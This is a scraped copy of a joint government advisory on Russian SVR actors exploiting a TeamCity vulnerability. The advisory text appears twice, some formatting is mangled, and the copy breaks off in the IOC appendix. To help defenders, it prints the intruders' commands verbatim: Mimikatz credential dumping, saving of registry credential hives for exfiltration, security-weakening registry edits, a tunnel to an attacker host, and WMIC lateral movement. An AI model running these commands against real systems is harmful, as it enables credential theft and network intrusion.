?? ?? 00 00 E8 [4] 48 [4]            48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 A0 00 00 00        }
    condition:        all of them}




Note: These rules are meant for threat hunting and have not been tested on a larger dataset.
MITIGATIONS
The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Apply available patches for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023, if not already completed.
Monitor the network for evidence of encoded commands and execution of network scanning tools.
Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.
Require use of multi-factor authentication [CPG 1.3] for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.

Organizations should adopt multi-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.


Keep all operating systems, software, and firmware up to date. Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization’s security baseline and incorporate into enterprise monitoring tools.
Audit log files to identify attempts to access privileged certificates and creation of fake identity providers.
Deploy software to identify suspicious behavior on systems.
Deploy endpoint protection systems with the ability to monitor for behavioral indicators of compromise.
Use available public resources to identify credential abuse with cloud environments.
Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see previous tables).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES

FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders
NSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied Networks
CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise
CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments
CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations
CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber Activity
FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. Think Tanks
CISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development
NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development

The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.
VERSION HISTORY
December 12, 2023: Initial version.
APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793
On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:
[2023-09-26 11:53:46,970]   INFO - ntrollers.FileBrowseController - File edited: C:\ProgramData\JetBrains\TeamCity\config\internal.properties by user with id=1[2023-09-26 11:53:46,970]   INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified by ""user with id=1""[2023-09-26 11:53:58,227]   INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe ""/c whoami""
An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP proxy may have suitable logs showing the following target endpoints being accessed:

/app/rest/users/id:1/tokens/RPC2 – This endpoint is required to exploit the vulnerability.
/app/rest/users – This endpoint is only required if the attacker wishes to create an arbitrary user.
/app/rest/debug/processes – This endpoint is only required if the attacker wishes to create an arbitrary process.

Note: The user ID value may be higher than 1.
APPENDIX B – IOCS
File IoCs
GraphicalProton backdoor:

01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732
34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E
620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869
773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13
7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53
8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7
971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC
CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF
CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43
EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E
F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB
C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4
4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166

GraphicalProton HTTPS backdoor:

18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93
19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641
1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8
219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67
92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6
B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7
C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD
C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0
C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3
F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69

Backdoored vcperf:

D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443

Backdoored Zabbix installation archive:

4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F

Backdoored Webroot AV installation archive:

950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4

Modified rsockstun

CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF

Network IoCs
Tunnel Endpoints

65.20.97[.]203
65.21.51[.]58

Exploitation Server

103.76.128[.]34

GraphicalProton HTTPS C2 URL:
hxxps://matclick[.]com/wp-query[.]php







This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'T1003.002', 'T1562.001', 'T1027.001', 'T1020', 'T1098', 'T1203', 'T1564', 'T1567', 'T1190', 'T1068', 'T1558.001', 'T1210', 'T1003.001', 'T1572', 'T1049', 'T1590', 'T1564.001', 'T1547', 'T1592.002', 'T1003', 'T1046', 'T1568', 'T1057', 'T1505.001', 'T1574.002', 'T1059.001', 'T1590.004', 'T1033', 'T1047', 'T1053.005', 'T1059.003', 'T1055', 'T1555.003', 'T1036'}","



SUMMARY
The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.
Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.
To bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.
Download the PDF version of this report:


AA23-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally
(PDF,       774.65 KB
  )


For a downloadable copy of IOCs, see:


AA23-347A STIX XML
(XML,       76.99 KB
  )




AA23-347A STIX JSON
(JSON,       69.29 KB
  )


THREAT OVERVIEW
SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.
A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR’s responsibility to collect political intelligence, the collection of which has long been the SVR’s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.
Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development. Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR’s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.
In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’ networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.
In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.
Initial Access - Exploitation
The SVR started to exploit Internet-connected JetBrains TeamCity servers, in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution, with high privileges granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.
Host Reconnaissance
Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance,:

whoami /priv
whoami /all
whoami /groups
whoami /domain
nltest -dclist
nltest -dsgetdc
tasklist
netstat
wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief
wmic /node:""""<redacted>"""" process list brief
wmic process get commandline -all
wmic process <proc_id> get commandline
wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed
powershell (,adsisearcher,""((samaccountname=<redacted>))"").Findall().Properties
powershell (,adsisearcher,""((samaccountname=<redacted>))"").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All

File Exfiltration
Additionally, the authoring agencies have observed the SVR exfiltrating files, which may provide insight into the host system’s operating system:

C:\Windows\system32\ntoskrnl.exe to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.
SQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:

C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\secforwarder.dll


Visual Studio files – based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:

C:\Program Files (x86)\Microsoft Visual Studio\2017\SQL\Common7\IDE\VSIXAutoUpdate.exe
Update management agent files – based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:

C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe
C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd
C:\ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf





Interest in SQL Server
Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server,:

powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll"" -DestinationPath C:\Windows\temp\1\sql.zip
SVR cyber actors also exfiltrated secforwarder.dll

Tactics Used to Avoid Detection
To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver”, technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software,.
This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims,. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory,.
In several cases SVR attempted to hide their backdoors via:

Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,
Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,
Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.

To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files, illustrated below:

 


Privilege Escalation
To facilitate privilege escalation, the SVR used multiple techniques, including WinPEAS, NoLMHash registry key modification, and the Mimikatz tool.
The SVR modified the NoLMHash registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d ""0"" /f

The SVR used the following Mimikatz commands,:

privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords

Persistence
The SVR relied on scheduled tasks, to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:

C:\Windows\temp
C:\Windows\System32
C:\Windows\WinStore

The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of Compromise.
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs),.
Sensitive Data Exfiltration,
The SVR exfiltrated the following Windows Registry hives from its victims,:

HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY

In order to exfiltrate Windows Registry, the SVR saved hives into files, packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\ directory.

reg save HKLM\SYSTEM """"C:\Windows\temp\1\sy.sa"""" /y
reg save HKLM\SAM """"C:\Windows\temp\1\sam.sa"""" /y
reg save HKLM\SECURITY """"C:\Windows\temp\1\se.sa"""" /y
powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q

In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.
SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to obtain a sensitive Domain information.
Network Reconnaissance
After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance,. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory,. The SVR executed the following PowerSploit commands:

Get-NetComputer
Get-NetGroup
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""
Get-NetDiDomain
Get-AdUser
Get-DomainUser -UserName
Get-NetUser -PreauthNotRequire
Get-NetComputer | select samaccountname
Get-NetUser -SPN | select serviceprincipalname

Tunneling into Compromised Environments
In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure,.
The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:

65.20.97,.,203:443
Poetpages,.,com:8443

The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC), utility after dropping it to disk:

wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""

Lateral Movement
The SVR used WMIC to facilitate lateral movement,.

wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create """"rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost""""

The SVR also modified DisableRestrictedAdmin key to enable remote connections,.
It modified Registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d ""0"" /f

Adversary Toolset
In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:

GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs, to exchange data with the SVR operator.
After execution, GraphicalProton gathers environment information such as active TCP/UDP connections, running processes, as well as user, host, and domain names,. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel,. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results,. Directory name is re-randomized each time the GraphicalProton process is started.
BMP files that were used to exchange data were generated in the following way:


Compress data using zlib,
Encrypt data using custom algorithm,
Add “***” string literal to encrypted data,
Create a random BMP with random rectangle,
And finally, encode encrypted data within lower pixel bits.

While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are especially noteworthy – a variant that uses DLL hijacking, in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf, an open-source C++ build analysis tool from Microsoft.

GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.


MITRE ATT&CK TACTICS AND TECHNIQUES
See below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.











INDICATORS OF COMPROMISE
Note: Please refer to Appendix B for a list of IOCs.
VICTIM TYPES
As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.
DETECTION METHODS
The following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization’s environment and telemetry.
SIGMA Rules

YARA rules
The following rule detects most known GraphicalProton variants.

Note: These rules are meant for threat hunting and have not been tested on a larger dataset.
MITIGATIONS
The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Apply available patches for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023, if not already completed.
Monitor the network for evidence of encoded commands and execution of network scanning tools.
Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.
Require use of multi-factor authentication,CPG 1.3, for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.

Organizations should adopt multi-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.


Keep all operating systems, software, and firmware up to date. Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization’s security baseline and incorporate into enterprise monitoring tools.
Audit log files to identify attempts to access privileged certificates and creation of fake identity providers.
Deploy software to identify suspicious behavior on systems.
Deploy endpoint protection systems with the ability to monitor for behavioral indicators of compromise.
Use available public resources to identify credential abuse with cloud environments.
Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see previous tables).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES

FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders
NSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied Networks
CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise
CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments
CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations
CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber Activity
FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. Think Tanks
CISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development
NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development

The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.
VERSION HISTORY
December 12, 2023: Initial version.
APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793
On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:,2023-09-26 11:53:46,970,   INFO - ntrollers.FileBrowseController - File edited: C:\ProgramData\JetBrains\TeamCity\config\internal.properties by user with id=1,2023-09-26 11:53:46,970,   INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified by ""user with id=1"",2023-09-26 11:53:58,227,   INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe ""/c whoami""
An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP proxy may have suitable logs showing the following target endpoints being accessed:

/app/rest/users/id:1/tokens/RPC2 – This endpoint is required to exploit the vulnerability.
/app/rest/users – This endpoint is only required if the attacker wishes to create an arbitrary user.
/app/rest/debug/processes – This endpoint is only required if the attacker wishes to create an arbitrary process.

Note: The user ID value may be higher than 1.
APPENDIX B – IOCS
File IoCs
GraphicalProton backdoor:

01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732
34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E
620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869
773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13
7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53
8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7
971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC
CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF
CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43
EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E
F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB
C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4
4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166

GraphicalProton HTTPS backdoor:

